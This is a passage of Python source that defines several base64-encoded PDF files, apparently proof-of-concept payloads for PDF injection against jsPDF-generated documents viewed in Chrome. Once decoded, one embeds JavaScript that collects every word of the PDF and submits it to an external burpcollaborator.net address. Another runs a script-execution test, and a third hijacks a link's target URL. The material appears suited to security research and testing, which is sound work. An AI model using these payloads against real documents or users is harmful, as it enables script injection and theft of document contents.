NlciAoanNQREYgMi4xLjEpCi9DcmVhdGlvbkRhdGUgKEQ6MjAyMDEwMjAxMDM1MTMrMDEnMDAnKQo+PgplbmRvYmoKMjAgMCBvYmoKPDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDEgMCBSCi9PcGVuQWN0aW9uIFszIDAgUiAvRml0SCBudWxsXQovUGFnZUxheW91dCAvT25lQ29sdW1uCj4+CmVuZG9iagp4cmVmCjAgMjEKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwNzE0IDAwMDAwIG4gCjAwMDAwMDI1MzEgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwNTM3IDAwMDAwIG4gCjAwMDAwMDA3NzEgMDAwMDAgbiAKMDAwMDAwMDg5NiAwMDAwMCBuIAowMDAwMDAxMDI2IDAwMDAwIG4gCjAwMDAwMDExNTkgMDAwMDAgbiAKMDAwMDAwMTI5NiAwMDAwMCBuIAowMDAwMDAxNDE5IDAwMDAwIG4gCjAwMDAwMDE1NDggMDAwMDAgbiAKMDAwMDAwMTY4MCAwMDAwMCBuIAowMDAwMDAxODE2IDAwMDAwIG4gCjAwMDAwMDE5NDQgMDAwMDAgbiAKMDAwMDAwMjA3MSAwMDAwMCBuIAowMDAwMDAyMjAwIDAwMDAwIG4gCjAwMDAwMDIzMzMgMDAwMDAgbiAKMDAwMDAwMjQzNSAwMDAwMCBuIAowMDAwMDAyNzc5IDAwMDAwIG4gCjAwMDAwMDI4NjUgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAyMQovUm9vdCAyMCAwIFIKL0luZm8gMTkgMCBSCi9JRCBbIDw0NzM2MTJGMDExMEQzOTE0OTQwREQ0RjYxNzU2ODIwRj4gPDQ3MzYxMkYwMTEwRDM5MTQ5NDBERDRGNjE3NTY4MjBGPiBdCj4+CnN0YXJ0eHJlZgoyOTY5CiUlRU9G')
    pdf_ssrf30_jspdf_chrome_extracting_text_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKCMpPj4gPDwvVHlwZS9Bbm5vdC9SZWN0WzAgMCA5MDAgOTAwXS9TdWJ0eXBlL1dpZGdldC9QYXJlbnQ8PC9GVC9CdG4vVChhKT4+L0E8PC9TL0phdmFTY3JpcHQvSlMoCndvcmRzID0gW107CmZvcihwYWdlPTA7cGFnZTx0aGlzLm51bVBhZ2VzO3BhZ2UrKykgewogICAgZm9yKHdvcmRQb3M9MDt3b3JkUG9zPHRoaXMuZ2V0UGFnZU51bVdvcmRzKHBhZ2UpO3dvcmRQb3MrKykgewogICAgICAgIHdvcmQgPSB0aGlzLmdldFBhZ2VOdGhXb3JkKHBhZ2UsIHdvcmRQb3MsIHRydWUpOwogICAgICAgIHdvcmRzLnB1c2god29yZCk7CiAgICB9Cn0KYXBwLmFsZXJ0KHdvcmRzKTsKdGhpcy5zdWJtaXRGb3JtKCdodHRwczovL21jMjR5NjA2b25hcjdtYWx5OXBvejg1Mzl1Zm4zYy5idXJwY29sbGFib3JhdG9yLm5ldD93b3Jkcz0nK2VuY29kZVVSSUNvbXBvbmVudCh3b3Jkcy5qb2luKCcsJykpKTsKKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDMzMgo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihDbGljayBtZSB0ZXN0KSBUagpFVApCVAovRjEgMTYgVGYKMTguMzk5OTk5OTk5OTk5OTk4NiBUTAowIGcKNTYuNjkyOTEzMzg1ODI2Nzc3NSA3MjguNTA0MTczMjI4MzQ2NDE3MSBUZAooQWJjIERlZikgVGoKRVQKQlQKL0YxIDE2IFRmCjE4LjM5OTk5OTk5OTk5OTk5ODYgVEwKMCBnCjU2LjY5MjkxMzM4NTgyNjc3NzUgNjcxLjgxMTI1OTg0MjUxOTY4OTMgVGQKKFNvbWUgd29yZCkgVGoKRVQKZW5kc3RyZWFtCmVuZG9iagoxIDAgb2JqCjw8L1R5cGUgL1BhZ2VzCi9LaWRzIFszIDAgUiBdCi9Db3VudCAxCj4+CmVuZG9iago1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago3IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago5IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllcgovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTMgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Sb21hbgovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1JdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE3IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvWmFwZkRpbmdiYXRzCi9TdWJ0eXBlIC9UeXBlMQovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvU3ltYm9sCi9TdWJ0eXBlIC9UeXBlMQovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1Byb2NTZXQgWy9QREYgL1RleHQgL0ltYWdlQiAvSW1hZ2VDIC9JbWFnZUldCi9Gb250IDw8Ci9GMSA1IDAgUgovRjIgNiAwIFIKL0YzIDcgMCBSCi9GNCA4IDAgUgovRjUgOSAwIFIKL0Y2IDEwIDAgUgovRjcgMTEgMCBSCi9GOCAxMiAwIFIKL0Y5IDEzIDAgUgovRjEwIDE0IDAgUgovRjExIDE1IDAgUgovRjEyIDE2IDAgUgovRjEzIDE3IDAgUgovRjE0IDE4IDAgUgo+PgovWE9iamVjdCA8PAo+Pgo+PgplbmRvYmoKMTkgMCBvYmoKPDwKL1Byb2R1Y2VyIChqc1BERiAyLjEuMSkKL0NyZWF0aW9uRGF0ZSAoRDoyMDIwMTAxNjEzNTAxOCswMScwMCcpCj4+CmVuZG9iagoyMCAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMSAwIFIKL09wZW5BY3Rpb24gWzMgMCBSIC9GaXRIIG51bGxdCi9QYWdlTGF5b3V0IC9PbmVDb2x1bW4KPj4KZW5kb2JqCnhyZWYKMCAyMQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDExMzkgMDAwMDAgbiAKMDAwMDAwMjk1NiAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDA3NTYgMDAwMDAgbiAKMDAwMDAwMTE5NiAwMDAwMCBuIAowMDAwMDAxMzIxIDAwMDAwIG4gCjAwMDAwMDE0NTEgMDAwMDAgbiAKMDAwMDAwMTU4NCAwMDAwMCBuIAowMDAwMDAxNzIxIDAwMDAwIG4gCjAwMDAwMDE4NDQgMDAwMDAgbiAKMDAwMDAwMTk3MyAwMDAwMCBuIAowMDAwMDAyMTA1IDAwMDAwIG4gCjAwMDAwMDIyNDEgMDAwMDAgbiAKMDAwMDAwMjM2OSAwMDAwMCBuIAowMDAwMDAyNDk2IDAwMDAwIG4gCjAwMDAwMDI2MjUgMDAwMDAgbiAKMDAwMDAwMjc1OCAwMDAwMCBuIAowMDAwMDAyODYwIDAwMDAwIG4gCjAwMDAwMDMyMDQgMDAwMDAgbiAKMDAwMDAwMzI5MCAwMDAwMCBuIAp0cmFpbGVyCjw8Ci9TaXplIDIxCi9Sb290IDIwIDAgUgovSW5mbyAxOSAwIFIKL0lEIFsgPDRBMzFCQkIyODIzRDg2NjQ0RjBFQjU2QkY1MTI1NzYwPiA8NEEzMUJCQjI4MjNEODY2NDRGMEVCNTZCRjUxMjU3NjA+IF0KPj4Kc3RhcnR4cmVmCjMzOTQKJSVFT0Y=')
    pdf_xss19_jspdf_chrome_js_execution_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKCMpPj4+Pjw8L1R5cGUvQW5ub3QvUmVjdFsgMCAwIDkwMCA5MDBdL1N1YnR5cGUvV2lkZ2V0L1BhcmVudDw8L0ZUL0J0bi9UKEEpPj4vQTw8L1MvSmF2YVNjcmlwdC9KUyhhcHAuYWxlcnQoMSkpLygpID4+ID4+Cl0KL0NvbnRlbnRzIDQgMCBSCj4+CmVuZG9iago0IDAgb2JqCjw8Ci9MZW5ndGggMTI2Cj4+CnN0cmVhbQowLjU2NzAwMDAwMDAwMDAwMDEgdwowIEcKQlQKL0YxIDE2IFRmCjE4LjM5OTk5OTk5OTk5OTk5ODYgVEwKMCBnCjU2LjY5MjkxMzM4NTgyNjc3NzUgNzg1LjE5NzA4NjYxNDE3MzI1ODYgVGQKKFRlc3QgdGV4dCkgVGoKRVQKZW5kc3RyZWFtCmVuZG9iagoxIDAgb2JqCjw8L1R5cGUgL1BhZ2VzCi9LaWRzIFszIDAgUiBdCi9Db3VudCAxCj4+CmVuZG9iago1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago3IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1Cb2xkT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago5IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvQ291cmllcgovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItQm9sZAovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItT2JsaXF1ZQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxMiAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXItQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTMgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Sb21hbgovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1RpbWVzLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTUgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1JdGFsaWMKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE3IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvWmFwZkRpbmdiYXRzCi9TdWJ0eXBlIC9UeXBlMQovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE4IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvU3ltYm9sCi9TdWJ0eXBlIC9UeXBlMQovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1Byb2NTZXQgWy9QREYgL1RleHQgL0ltYWdlQiAvSW1hZ2VDIC9JbWFnZUldCi9Gb250IDw8Ci9GMSA1IDAgUgovRjIgNiAwIFIKL0YzIDcgMCBSCi9GNCA4IDAgUgovRjUgOSAwIFIKL0Y2IDEwIDAgUgovRjcgMTEgMCBSCi9GOCAxMiAwIFIKL0Y5IDEzIDAgUgovRjEwIDE0IDAgUgovRjExIDE1IDAgUgovRjEyIDE2IDAgUgovRjEzIDE3IDAgUgovRjE0IDE4IDAgUgo+PgovWE9iamVjdCA8PAo+Pgo+PgplbmRvYmoKMTkgMCBvYmoKPDwKL1Byb2R1Y2VyIChqc1BERiAyLjEuMSkKL0NyZWF0aW9uRGF0ZSAoRDoyMDIwMTAxNjEzMDYxNSswMScwMCcpCj4+CmVuZG9iagoyMCAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMSAwIFIKL09wZW5BY3Rpb24gWzMgMCBSIC9GaXRIIG51bGxdCi9QYWdlTGF5b3V0IC9PbmVDb2x1bW4KPj4KZW5kb2JqCnhyZWYKMCAyMQowMDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDA1OTkgMDAwMDAgbiAKMDAwMDAwMjQxNiAwMDAwMCBuIAowMDAwMDAwMDE1IDAwMDAwIG4gCjAwMDAwMDA0MjIgMDAwMDAgbiAKMDAwMDAwMDY1NiAwMDAwMCBuIAowMDAwMDAwNzgxIDAwMDAwIG4gCjAwMDAwMDA5MTEgMDAwMDAgbiAKMDAwMDAwMTA0NCAwMDAwMCBuIAowMDAwMDAxMTgxIDAwMDAwIG4gCjAwMDAwMDEzMDQgMDAwMDAgbiAKMDAwMDAwMTQzMyAwMDAwMCBuIAowMDAwMDAxNTY1IDAwMDAwIG4gCjAwMDAwMDE3MDEgMDAwMDAgbiAKMDAwMDAwMTgyOSAwMDAwMCBuIAowMDAwMDAxOTU2IDAwMDAwIG4gCjAwMDAwMDIwODUgMDAwMDAgbiAKMDAwMDAwMjIxOCAwMDAwMCBuIAowMDAwMDAyMzIwIDAwMDAwIG4gCjAwMDAwMDI2NjQgMDAwMDAgbiAKMDAwMDAwMjc1MCAwMDAwMCBuIAp0cmFpbGVyCjw8Ci9TaXplIDIxCi9Sb290IDIwIDAgUgovSW5mbyAxOSAwIFIKL0lEIFsgPDE4RjFBNTc2Mzg3NkRFQjNGMDQ3MEEzRDQ3M0UxREZEPiA8MThGMUE1NzYzODc2REVCM0YwNDcwQTNENDczRTFERkQ+IF0KPj4Kc3RhcnR4cmVmCjI4NTQKJSVFT0Y=')
    pdf_ssrf31_jspdf_chrome_injection_overwrite_url_content = base64.b64decode('JVBERi0xLjMKJbrfrOAKMyAwIG9iago8PC9UeXBlIC9QYWdlCi9QYXJlbnQgMSAwIFIKL1Jlc291cmNlcyAyIDAgUgovTWVkaWFCb3ggWzAgMCA1OTUuMjc5OTk5OTk5OTk5OTcyNyA4NDEuODg5OTk5OTk5OTk5OTg2NF0KL0Fubm90cyBbCjw8L1R5cGUgL0Fubm90IC9TdWJ0eXBlIC9MaW5rIC9SZWN0IFswLiA4MTMuNTQzNTQzMzA3MDg2NTY1NiA1NjYuOTI5MTMzODU4MjY3NzMyNiAyNDYuNjE0NDA5NDQ4ODE4ODMzXSAvQm9yZGVyIFswIDAgMF0gL0EgPDwvUyAvVVJJIC9VUkkgKC9ibGFoKT4+L0E8PC9TL1VSSS9VUkkoaHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQpL1R5cGUvQWN0aW9uPj4vRiAwPj4oKSA+PiA+PgpdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVuZ3RoIDEyNgo+PgpzdHJlYW0KMC41NjcwMDAwMDAwMDAwMDAxIHcKMCBHCkJUCi9GMSAxNiBUZgoxOC4zOTk5OTk5OTk5OTk5OTg2IFRMCjAgZwo1Ni42OTI5MTMzODU4MjY3Nzc1IDc4NS4xOTcwODY2MTQxNzMyNTg2IFRkCihUZXN0IHRleHQpIFRqCkVUCmVuZHN0cmVhbQplbmRvYmoKMSAwIG9iago8PC9UeXBlIC9QYWdlcwovS2lkcyBbMyAwIFIgXQovQ291bnQgMQo+PgplbmRvYmoKNSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYQovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iago2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvSGVsdmV0aWNhLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0hlbHZldGljYS1PYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjggMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9IZWx2ZXRpY2EtQm9sZE9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKOSAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL0NvdXJpZXIKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTAgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGQKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTEgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLU9ibGlxdWUKL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTIgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9Db3VyaWVyLUJvbGRPYmxpcXVlCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjEzIDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtUm9tYW4KL1N1YnR5cGUgL1R5cGUxCi9FbmNvZGluZyAvV2luQW5zaUVuY29kaW5nCi9GaXJzdENoYXIgMzIKL0xhc3RDaGFyIDI1NQo+PgplbmRvYmoKMTQgMCBvYmoKPDwKL1R5cGUgL0ZvbnQKL0Jhc2VGb250IC9UaW1lcy1Cb2xkCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE1IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtSXRhbGljCi9TdWJ0eXBlIC9UeXBlMQovRW5jb2RpbmcgL1dpbkFuc2lFbmNvZGluZwovRmlyc3RDaGFyIDMyCi9MYXN0Q2hhciAyNTUKPj4KZW5kb2JqCjE2IDAgb2JqCjw8Ci9UeXBlIC9Gb250Ci9CYXNlRm9udCAvVGltZXMtQm9sZEl0YWxpYwovU3VidHlwZSAvVHlwZTEKL0VuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxNyAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1phcGZEaW5nYmF0cwovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoxOCAwIG9iago8PAovVHlwZSAvRm9udAovQmFzZUZvbnQgL1N5bWJvbAovU3VidHlwZSAvVHlwZTEKL0ZpcnN0Q2hhciAzMgovTGFzdENoYXIgMjU1Cj4+CmVuZG9iagoyIDAgb2JqCjw8Ci9Qcm9jU2V0IFsvUERGIC9UZXh0IC9JbWFnZUIgL0ltYWdlQyAvSW1hZ2VJXQovRm9udCA8PAovRjEgNSAwIFIKL0YyIDYgMCBSCi9GMyA3IDAgUgovRjQgOCAwIFIKL0Y1IDkgMCBSCi9GNiAxMCAwIFIKL0Y3IDExIDAgUgovRjggMTIgMCBSCi9GOSAxMyAwIFIKL0YxMCAxNCAwIFIKL0YxMSAxNSAwIFIKL0YxMiAxNiAwIFIKL0YxMyAxNyAwIFIKL0YxNCAxOCAwIFIKPj4KL1hPYmplY3QgPDwKPj4KPj4KZW5kb2JqCjE5IDAgb2JqCjw8Ci9Qcm9kdWNlciAoanNQREYgMi4xLjEpCi9DcmVhdGlvbkRhdGUgKEQ6MjAyMDEwMTYxMTUwMDYrMDEnMDAnKQo+PgplbmRvYmoKMjAgMCBvYmoKPDwKL1R5cGUgL0NhdGFsb2cKL1BhZ2VzIDEgMCBSCi9PcGVuQWN0aW9uIFszIDAgUiAvRml0SCBudWxsXQovUGFnZUxheW91dCAvT25lQ29sdW1uCj4+CmVuZG9iagp4cmVmCjAgMjEKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwNTU1IDAwMDAwIG4gCjAwMDAwMDIzNzIgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwMzc4IDAwMDAwIG4gCjAwMDAwMDA2MTIgMDAwMDAgbiAKMDAwMDAwMDczNyAwMDAwMCBuIAowMDAwMDAwODY3IDAwMDAwIG4gCjAwMDAwMDEwMDAgMDAwMDAgbiAKMDAwMDAwMTEzNyAwMDAwMCBuIAowMDAwMDAxMjYwIDAwMDAwIG4gCjAwMDAwMDEzODkgMDAwMDAgbiAKMDAwMDAwMTUyMSAwMDAwMCBuIAowMDAwMDAxNjU3IDAwMDAwIG4gCjAwMDAwMDE3ODUgMDAwMDAgbiAKMDAwMDAwMTkxMiAwMDAwMCBuIAowMDAwMDAyMDQxIDAwMDAwIG4gCjAwMDAwMDIxNzQgMDAwMDAgbiAKMDAwMDAwMjI3NiAwMDAwMCBuIAowMDAwMDAyNjIwIDAwMDAwIG4gCjAwMDAwMDI3MDYgMDAwMDAgbiAKdHJhaWxlcgo8PAovU2l6ZSAyMQovUm9vdCAyMCAwIFIKL0luZm8gMTkgMCBSCi9JRCBbIDxEOTE1OTFCOUVERkM5NkM1QURCQjI5RDZBQjgwMEYzMT4gPEQ5MTU5MUI5RURGQzk2QzVB